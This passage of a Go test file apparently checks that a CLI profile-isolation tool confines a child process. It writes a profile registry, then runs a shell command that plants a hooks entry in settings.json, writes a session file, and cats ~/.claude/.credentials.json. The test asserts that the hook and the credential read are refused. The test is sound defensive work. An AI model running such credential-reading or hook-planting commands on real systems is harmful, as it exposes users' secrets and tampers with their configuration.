"claude:work":{"tool":"claude","configDir":"~/.claude-work","email":"b"}}}`
	os.WriteFile(filepath.Join(e.home, ".clausona", "profiles.json"), []byte(reg), 0o600)
	r := e.run(nil, "run", "-q", "--integration", "clausona.profile=claude:work", "--", "sh", "-c",
		`echo '{"hooks":{"x":1}}' > "$HOME/.claude-work/settings.json" && echo HOOK; echo s > "$HOME/.claude-work/projects/s.jsonl" && echo SESSION-OK; cat "$HOME/.claude/.credentials.json"`)
	refuse(t, r, "HOOK")
	refuse(t, r, "PRIMAER-TOKEN")
	expect(t, r, "SESSION-OK")
}
